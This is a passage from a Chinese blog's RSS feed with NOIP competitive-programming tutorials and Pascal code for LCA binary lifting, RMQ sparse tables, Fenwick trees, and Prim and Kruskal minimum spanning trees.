class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> qn <span class="hljs-keyword">do</span></span><br><span class="line">        writeln(questions[i].ans);</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/LCA/">LCA</category>
      
      
      <comments>https://i.hsfzxjy.site/lca-Tarjan/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>LCA 树上倍增</title>
      <link>https://i.hsfzxjy.site/lca-tree-multiplier/</link>
      <guid>https://i.hsfzxjy.site/lca-tree-multiplier/</guid>
      <pubDate>Sun, 02 Nov 2014 00:23:13 GMT</pubDate>
      
        
        
      <description>&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt;&lt;/sp</description>
        
      
      
      
      <content:encoded><![CDATA[<div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    a: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>, <span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> boolean;</span><br><span class="line">    depth: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    father: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>, <span class="hljs-number">0</span>..<span class="hljs-number">16</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    n, m, i, x, y: longint;</span><br><span class="line">    root: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dfs</span><span class="hljs-params">(x: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: longint;</span><br><span class="line">    j: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    depth[x] := depth[father[x][<span class="hljs-number">0</span>]]+<span class="hljs-number">1</span>;</span><br><span class="line">    j := <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>&lt;&lt;j&lt;=depth[x]-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        father[x][j] := father[father[x][j-<span class="hljs-number">1</span>]][j-<span class="hljs-number">1</span>];</span><br><span class="line">        inc(j);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> a[x][i] <span class="hljs-keyword">or</span> (father[x][<span class="hljs-number">0</span>] = i) <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">        father[i][<span class="hljs-number">0</span>] := x;</span><br><span class="line">        dfs(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">var</span> x, y: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    t := x;</span><br><span class="line">    x := y;</span><br><span class="line">    y := t;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lca</span><span class="hljs-params">(x, y: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t, j: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> depth[x] &lt; depth[y] <span class="hljs-keyword">then</span></span><br><span class="line">        swap(x, y);</span><br><span class="line"></span><br><span class="line">    t := depth[x] - depth[y];</span><br><span class="line">    <span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">15</span> <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">if</span> t <span class="hljs-keyword">and</span> (<span class="hljs-number">1</span>&lt;&lt;j) &lt;&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">            x := father[x][j];</span><br><span class="line">    <span class="hljs-keyword">if</span> x = y <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(x);</span><br><span class="line">    <span class="hljs-keyword">for</span> j := <span class="hljs-number">15</span> <span class="hljs-keyword">downto</span> <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">if</span> father[x][j] &lt;&gt; father[y][j] <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            x := father[x][j];</span><br><span class="line">            y := father[y][j];</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    lca := father[x][<span class="hljs-number">0</span>];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">read</span>(n, m);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> m <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(x, y);</span><br><span class="line">        a[x, y] := true;</span><br><span class="line">        a[y, x] := true;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">read</span>(root);</span><br><span class="line">    father[root][<span class="hljs-number">0</span>] := root;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(x, y);</span><br><span class="line">        writeln(lca(x, y));</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/lca-tree-multiplier/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RMQ（二进制方法）</title>
      <link>https://i.hsfzxjy.site/RMQ-binary/</link>
      <guid>https://i.hsfzxjy.site/RMQ-binary/</guid>
      <pubDate>Sat, 01 Nov 2014 23:07:05 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;问题描述&quot;&gt;问题描述&lt;/h2&gt;
&lt;p &gt;已知数组 a 以及若干个查询 $(x, y)$，求 $a[x..y]$ 之间的最小值。&lt;/p&gt;
&lt;h2 id=&quot;分析-6&quot;&gt;分析&lt;/h2&gt;
&lt;p &gt;不难发现：若取 t 使得$2^t&#92;leq y-x+1$且$2^{t+1}&amp;g</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="问题描述">问题描述</h2><p >已知数组 a 以及若干个查询 $(x, y)$，求 $a[x..y]$ 之间的最小值。</p><h2 id="分析-6">分析</h2><p >不难发现：若取 t 使得$2^t\leq y-x+1$且$2^{t+1}&gt;y-x+1$，则有：</p><p >$$[x, x+t]\bigcup[y-t+1,y]=[x,y]$$</p><p  class="nomargin"> 运用二进制的思想，我们只需预处理出 $i..i+2^k-1$ 之间的最小值，即可快速完成查询。设 $dp[i][j]$ 为 $i..i+2^j-1$ 之间的最小值，则有：</p><p >$$dp[i][j]=min(dp[i][j-1],dp[i+2^{j-1}][j-1])$$</p><h2 id="code-9">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    a: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100000</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    dp: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100000</span>, <span class="hljs-number">0</span>..<span class="hljs-number">20</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    n, i: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">min</span><span class="hljs-params">(x, y: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x &lt; y <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x) <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span>(y);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">init</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, j: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span> dp[i, <span class="hljs-number">0</span>] := a[i];</span><br><span class="line">    j := <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>&lt;&lt;j-<span class="hljs-number">1</span>&lt;=n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n-<span class="hljs-number">1</span>&lt;&lt;(j-<span class="hljs-number">1</span>) <span class="hljs-keyword">do</span></span><br><span class="line">            dp[i, j] := min(dp[i, j-<span class="hljs-number">1</span>], dp[i+<span class="hljs-number">1</span>&lt;&lt;(j-<span class="hljs-number">1</span>), j-<span class="hljs-number">1</span>]);</span><br><span class="line">        inc(j);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span><span class="hljs-params">(x, y: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    t := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>&lt;&lt;(t+<span class="hljs-number">1</span>)&lt;=y-x+<span class="hljs-number">1</span>) <span class="hljs-keyword">do</span> inc(t);</span><br><span class="line">    query := min(dp[x][t], dp[y-(<span class="hljs-number">1</span>&lt;&lt;t)+<span class="hljs-number">1</span>][t]);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    x, y: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(n);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span> <span class="hljs-keyword">read</span>(a[i]);</span><br><span class="line">    init;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(x, y);</span><br><span class="line">        writeln(query(X, y));</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/RMQ-binary/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>树状数组</title>
      <link>https://i.hsfzxjy.site/tree-array/</link>
      <guid>https://i.hsfzxjy.site/tree-array/</guid>
      <pubDate>Sat, 01 Nov 2014 08:31:54 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
&lt;p &gt;所谓树状数组，就是将线性的数组预处理成树状的结构以降低时间复杂度。先来看一幅经典的图： &lt;img loading=&quot;lazy&quot; src=&quot;/assets/TArry1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p  class=&quot;par&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="介绍">介绍</h2><p >所谓树状数组，就是将线性的数组预处理成树状的结构以降低时间复杂度。先来看一幅经典的图： <img loading="lazy" src="/assets/TArry1.jpg" alt=""></p><p  class="par"> 其中的 a 数组为原生数组，c 数组为辅助数组，计算方式为： </p><p >$$c_1=a_1——{(1)}_{10}={(1)}_2$$ $$c_2=a_2+c_1——{(2)}_{10}={(10)}_2$$ $$\ldots$$ </p><p  class="nomargin"> 不难发现，$c_k$存储的实际上是从 $k$ 开始向前数 $k$ 的二进制表示中右边第一个 $1$ 所代表的数字个元素的和。这样写的好处便是可以利用位运算轻松计算 sum。上代码。</p><h2 id="code-11">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    n, i: longint;</span><br><span class="line">    a, c: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">10000</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//计算x最右边的1所代表的数字。</span></span><br><span class="line"><span class="hljs-comment">//如：lowbit(0b1100)=0b100</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(x: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    lowbit := x <span class="hljs-keyword">and</span> (-x);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//给a[index]加上x</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">index</span>, x: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    inc(a[<span class="hljs-keyword">index</span>], x);</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">index</span>&lt;=n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(c[<span class="hljs-keyword">index</span>], x);</span><br><span class="line">        inc(<span class="hljs-keyword">index</span>, lowbit(<span class="hljs-keyword">index</span>));</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//求a[1~index]的和</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sum</span><span class="hljs-params">(<span class="hljs-keyword">index</span>: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    sum := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">index</span>&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(sum, c[<span class="hljs-keyword">index</span>]);</span><br><span class="line">        dec(<span class="hljs-keyword">index</span>, lowbit(<span class="hljs-keyword">index</span>));</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    s: longint;</span><br><span class="line">    op: longint;</span><br><span class="line">    x,y: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(n);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(a[i]);</span><br><span class="line">        add(i, a[i]);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(op);</span><br><span class="line">        <span class="hljs-keyword">if</span> op = <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-comment">//添加操作</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">           <span class="hljs-keyword">read</span>(x, y);</span><br><span class="line">           Add(x, y);</span><br><span class="line">        <span class="hljs-keyword">end</span></span><br><span class="line">        <span class="hljs-keyword">else</span>           <span class="hljs-comment">//求和操作</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">read</span>(s);</span><br><span class="line">            writeln(sum(s));</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Binary-Indexed-Tree/">Binary Indexed Tree</category>
      
      
      <comments>https://i.hsfzxjy.site/tree-array/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>二进制的启示</title>
      <link>https://i.hsfzxjy.site/revelation-of-binary/</link>
      <guid>https://i.hsfzxjy.site/revelation-of-binary/</guid>
      <pubDate>Sat, 01 Nov 2014 07:43:19 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 在学习数论时我们都知道：只用 2 的幂次可以组合出所有的正整数。这便是二进制的魅力——状态简单而又变化万千。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;引子&quot;&gt;引子&lt;/h2&gt;
&lt;p &gt;实际算法中，常常</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 在学习数论时我们都知道：只用 2 的幂次可以组合出所有的正整数。这便是二进制的魅力——状态简单而又变化万千。</p></blockquote><h2 id="引子">引子</h2><p >实际算法中，常常有一些线性的但数据量特别大的问题，如区间求和、求最小值等。很多时候，为了把时间复杂度从 $O(n^2)$ 甚至更高的地方降下来，我们需要对数据进行一些预处理，以提高计算的速度。在这其中，有很大一部分是来自二进制运算特点的启发。</p><h2 id="目录">目录</h2><ol><li><a href="/2014-11-02-tree-array/">树状数组</a></li><li><a href="/2014-11-02-RMQ-binary/">RMQ</a></li><li><a href="/2014-11-02-lca-tree-multiplier/">LCA&amp;树上倍增</a></li></ol>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/revelation-of-binary/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>最小生成树（Kruscal &amp; Prim）</title>
      <link>https://i.hsfzxjy.site/kruscal-and-prim/</link>
      <guid>https://i.hsfzxjy.site/kruscal-and-prim/</guid>
      <pubDate>Sun, 26 Oct 2014 00:47:51 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 测试位置：&lt;a href=&quot;http://codevs.cn/problem/1078/&quot;&gt;WikiOI1078&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;gk-code hljs&quot; </description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 测试位置：<a href="http://codevs.cn/problem/1078/">WikiOI1078</a></p></blockquote><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span></span><br><span class="line">    TEdge = <span class="hljs-keyword">record</span></span><br><span class="line">        start, terminal: longint;</span><br><span class="line">        weight: int64;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    TEdgeArr = <span class="hljs-keyword">array</span> <span class="hljs-keyword">of</span> TEdge;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">operator</span> &lt;(e1, e2: TEdge)res: boolean;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    res := e1.weight &lt; e2.weight;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">operator</span> &gt;(e1, e2: TEdge)res: Boolean;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    res := e1.weight &gt; e2.weight;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">SortEdge</span><span class="hljs-params">(A: TEdgeArr; l, r: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, j: longint;</span><br><span class="line">    t, m: TEdge;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    i := l; j := r; m := A[(i+j) &gt;&gt; <span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">repeat</span></span><br><span class="line">        <span class="hljs-keyword">while</span> A[i]&lt;m <span class="hljs-keyword">do</span> inc(i);</span><br><span class="line">        <span class="hljs-keyword">while</span> A[j]&gt;m <span class="hljs-keyword">do</span> dec(j);</span><br><span class="line">        <span class="hljs-keyword">if</span> i&lt;=j <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            t := A[i];</span><br><span class="line">            A[i] := A[j];</span><br><span class="line">            A[j] := t;</span><br><span class="line">            inc(i); dec(j);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">until</span> i&gt;j;</span><br><span class="line">    <span class="hljs-keyword">if</span> i&lt;r <span class="hljs-keyword">then</span> SortEdge(A, i, r);</span><br><span class="line">    <span class="hljs-keyword">if</span> l&lt;j <span class="hljs-keyword">then</span> SortEdge(A, l, j);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    INF: int64 = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">60</span> <span class="hljs-keyword">div</span> <span class="hljs-number">3</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    map: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>, <span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> int64;</span><br><span class="line">    n, i, j: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">{</span></span><br><span class="line"><span class="hljs-comment">    @param x: 起始搜索节点</span></span><br><span class="line"><span class="hljs-comment">    算法思想：用一个数组维护从各个未加入顶点到</span></span><br><span class="line"><span class="hljs-comment">    树的最短边长度，操作n次，每次将距离最短的</span></span><br><span class="line"><span class="hljs-comment">    边加入到树中，并更新与之相邻的点的距离值。</span></span><br><span class="line"><span class="hljs-comment">}</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prim</span><span class="hljs-params">(x: longint)</span>:</span> int64;</span><br><span class="line"><span class="hljs-comment">{</span></span><br><span class="line"><span class="hljs-comment">    lowest: 储存各个节点到树的最短距离</span></span><br><span class="line"><span class="hljs-comment">    visited: 标记是否已加入树中</span></span><br><span class="line"><span class="hljs-comment">}</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    lowest: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> int64;</span><br><span class="line">    visited: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> boolean;</span><br><span class="line">    min: int64;</span><br><span class="line">    i, j, minindex: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    fillchar(visited, sizeof(visited), <span class="hljs-number">0</span>);</span><br><span class="line">    visited[x] := true;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//先将初始节点加入树中，更新lowest</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        lowest[i] := map[i, x];</span><br><span class="line"></span><br><span class="line">    prim := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">2</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        min := INF;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//找出树到外部节点最短的一条边</span></span><br><span class="line">        <span class="hljs-comment">//并将该边加入树中</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> visited[j]) <span class="hljs-keyword">and</span> (min &gt; lowest[j]) <span class="hljs-keyword">then</span></span><br><span class="line">            <span class="hljs-keyword">begin</span></span><br><span class="line">                min := lowest[j];</span><br><span class="line">                minindex := j;</span><br><span class="line">            <span class="hljs-keyword">end</span>;</span><br><span class="line">        visited[minindex] := true;</span><br><span class="line">        prim := prim + min;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//对新加入的那个节点，</span></span><br><span class="line">        <span class="hljs-comment">//更新与其相邻的未加入树的节点的lowest值</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">if</span> visited[j] <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">            <span class="hljs-keyword">if</span> map[j, minindex] &lt; lowest[j] <span class="hljs-keyword">then</span></span><br><span class="line">                lowest[j] := map[j, minindex];</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">{</span></span><br><span class="line"><span class="hljs-comment">    算法思想：</span></span><br><span class="line"><span class="hljs-comment">    1\. 先将边按照长度排序。</span></span><br><span class="line"><span class="hljs-comment">    2\. 遍历所有的边，若该边的两个顶点都在树中则跳过；</span></span><br><span class="line"><span class="hljs-comment">    否则将其加入树中。</span></span><br><span class="line"><span class="hljs-comment">}</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Kruscal</span>:</span> int64;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    Edges: TEdgeArr;</span><br><span class="line">    <span class="hljs-comment">//并查集，储存自己的父亲，若自己为根结点则为自己</span></span><br><span class="line">    <span class="hljs-comment">//这是一种常用的写法：否则如果存成0的话，想把两棵</span></span><br><span class="line">    <span class="hljs-comment">//树并在一起需要多一步判断。</span></span><br><span class="line">    UnionSet: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    i: longint;</span><br><span 